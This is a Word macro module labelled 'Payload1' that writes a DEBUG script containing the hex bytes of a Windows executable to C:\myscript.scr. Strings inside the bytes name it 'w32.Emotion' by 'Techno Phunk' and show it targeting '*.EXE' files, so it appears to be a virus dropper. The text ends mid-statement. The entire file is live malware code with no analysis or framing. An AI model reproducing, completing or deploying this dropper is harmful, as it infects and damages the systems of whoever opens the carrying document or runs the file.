Attribute VB_Name = "Payload1"

Public Sub MAIN()
Dim T$
T$ = Chr(13) + Chr(10)
WordBasic.Insert "Open " + Chr(34) + "C:\myscript.scr" + Chr(34) + _
" For Output As #1" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"n c:\myscript.exe" + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0100 4d 5a 50 00 02 00 00 00 04 00 0f 00 ff ff 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0110 b8 00 00 00 00 00 00 00 40 00 1a 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0120 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0130 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0140 ba 10 00 0e 1f b4 09 cd 21 b8 01 4c cd 21 90 90 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0150 54 68 69 73 20 70 72 6f 67 72 61 6d 20 6d 75 73 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0160 74 20 62 65 20 72 75 6e 20 75 6e 64 65 72 20 57 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0170 69 6e 33 32 0d 0a 24 37 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0180 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0190 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 01f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0200 50 45 00 00 4c 01 04 00 85 26 59 bd 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0210 00 00 00 00 e0 00 8e 81 0b 01 02 19 00 08 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0220 00 06 00 00 00 00 00 00 00 10 00 00 00 10 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0230 00 20 00 00 00 00 40 00 00 10 00 00 00 02 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0240 01 00 00 00 00 00 00 00 03 00 0a 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0250 00 50 00 00 00 04 00 00 04 3f 00 00 02 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0260 00 00 10 00 00 20 00 00 00 00 10 00 00 10 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0270 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0280 00 30 00 00 c2 01 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0290 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02a0 00 40 00 00 54 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 02f0 00 00 00 00 00 00 00 00 43 4f 44 45 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0300 00 10 00 00 00 10 00 00 00 08 00 00 00 04 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0310 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 e0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0320 44 41 54 41 00 00 00 00 00 10 00 00 00 20 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0330 00 02 00 00 00 0c 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0340 00 00 00 00 40 00 00 c0 2e 69 64 61 74 61 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0350 00 10 00 00 00 30 00 00 00 02 00 00 00 0e 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0360 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 c0 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0370 2e 72 65 6c 6f 63 00 00 00 10 00 00 00 40 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0380 00 02 00 00 00 10 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0390 00 00 00 00 40 00 00 50 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 03f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0400 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0410 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0420 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0430 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0440 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0450 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0460 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0470 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0480 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0490 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 04f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0500 6a 00 e8 77 06 00 00 68 04 01 00 00 68 25 14 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0510 00 50 e8 a3 06 00 00 e9 9d 00 00 00 68 04 01 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0520 00 68 1d 12 40 00 e8 77 06 00 00 68 1d 12 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0530 e8 79 06 00 00 c6 05 39 15 40 00 01 eb 7b e8 47 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0540 06 00 00 8b f0 bf 25 14 40 00 aa ac 0a c0 75 fa " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0550 b8 2e 00 00 00 bf 25 14 40 00 b9 04 01 00 00 f2 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0560 ae c7 07 62 69 6e 20 66 c7 05 25 14 40 00 20 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0570 68 29 15 40 00 e8 22 06 00 00 80 3d 2b 15 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0580 05 75 23 80 3d 2f 15 40 00 0d 75 1a 6a 10 68 6d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0590 11 40 00 68 91 11 40 00 6a 00 e8 27 06 00 00 6a " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05a0 01 e8 1a 06 00 00 6a 01 68 25 14 40 00 e8 02 06 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05b0 00 00 6a 00 e8 bf 05 00 00 68 3a 15 40 00 68 67 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05c0 11 40 00 e8 c8 05 00 00 83 f8 ff 74 3e bf 3a 15 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05d0 40 00 8d 77 2c 50 eb 45 57 8d 7f 2c b9 0d 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05e0 00 32 c0 f3 aa bf 21 13 40 00 b9 0d 00 00 00 32 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 05f0 c0 f3 aa 5f 58 50 57 50 e8 87 05 00 00 0b c0 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0600 0a bf 3a 15 40 00 8d 77 2c eb 12 80 3d 39 15 40 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0610 00 01 0f 84 26 ff ff ff e9 ff fe ff ff 57 66 8d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0620 77 2c bf 21 13 40 00 ac aa 0a c0 75 fa 33 c0 bf " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0630 21 13 40 00 b9 41 00 00 00 f2 ae c7 47 fc 62 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0640 6e 00 5f 68 21 13 40 00 8d 47 2c 50 e8 57 05 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0650 00 6a 00 8d 47 2c 50 b8 25 14 40 00 50 e8 34 05 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0660 00 00 e9 71 ff ff ff 2a 2e 45 58 45 00 77 33 32 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0670 2e 45 6d 6f 74 69 6f 6e 20 2d 20 42 79 3a 20 54 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0680 65 63 68 6e 6f 20 50 68 75 6e 6b 20 5b 54 49 5d " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0690 00 41 20 70 6f 6f 6c 20 6f 66 20 65 6d 6f 74 69 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06a0 6f 6e 73 2c 20 62 65 61 74 65 6e 20 61 6e 64 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06b0 61 62 75 73 65 64 2e 0d 0a 57 68 6f 20 77 69 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06c0 6c 20 73 77 69 6d 20 69 6e 20 74 68 65 20 73 74 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06d0 61 6c 65 20 77 61 74 65 72 73 3f 20 4e 6f 74 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06e0 61 20 6f 6e 65 0d 0a 42 75 74 20 6d 61 6e 79 20 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 06f0 77 69 6c 6c 20 73 63 6f 66 66 20 61 6e 64 20 64 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0700 65 73 74 72 6f 79 20 74 68 69 73 20 70 6f 6f 6c " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0710 20 77 69 74 68 20 61 70 61 74 68 79 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0720 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0730 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0740 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0750 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0760 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0770 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0780 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0790 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 07f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0800 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0810 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0820 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0830 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0840 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0850 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0860 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0870 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0880 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0890 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 08f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0900 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0910 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0920 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0930 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0940 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0950 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0960 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0970 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0980 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0990 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09a0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09b0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09d0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09e0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 09f0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a70 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a80 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0a90 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0aa0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ab0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ac0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ad0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ae0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0af0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b60 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b70 00 00 00 00 00 00 00 00 ff 25 7c 30 40 00 ff 25 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b80 80 30 40 00 ff 25 84 30 40 00 ff 25 88 30 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0b90 ff 25 8c 30 40 00 ff 25 90 30 40 00 ff 25 94 30 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0ba0 40 00 ff 25 98 30 40 00 ff 25 9c 30 40 00 ff 25 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bb0 a0 30 40 00 ff 25 a4 30 40 00 ff 25 a8 30 40 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bc0 ff 25 b0 30 40 00 ff 25 b4 30 40 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bd0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0be0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0bf0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
"e 0c40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 " + _
Chr(34) + "" + T$
WordBasic.Insert "print #1, " + Chr(34) + _
